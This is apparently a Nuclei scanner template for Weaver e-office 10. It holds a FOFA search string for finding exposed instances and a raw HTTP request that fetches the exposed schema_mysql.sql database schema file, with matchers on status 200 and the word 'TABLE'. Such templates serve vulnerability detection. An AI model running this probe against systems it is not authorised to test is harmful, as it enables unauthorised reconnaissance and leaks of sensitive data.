id: e-office-10-schema_mysql-sql

info:
  tags: e-office-10-schema_mysql-sql
  name: 泛微 e-office 10 schema_mysql.sql接口 敏感信息泄露漏洞
  author: xc
  severity: high
  description: |-
    fofa: body="eoffice_loading_tip" && body="eoffice10"
  
requests:
  - raw:
      - |+
        GET /eoffice10/empty_scene/db/schema_mysql.sql HTTP/1.1
        Host: {{Hostname}}
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36        
        Accept-Encoding: gzip,deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0


        
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "TABLE"
        condition: and
        part: body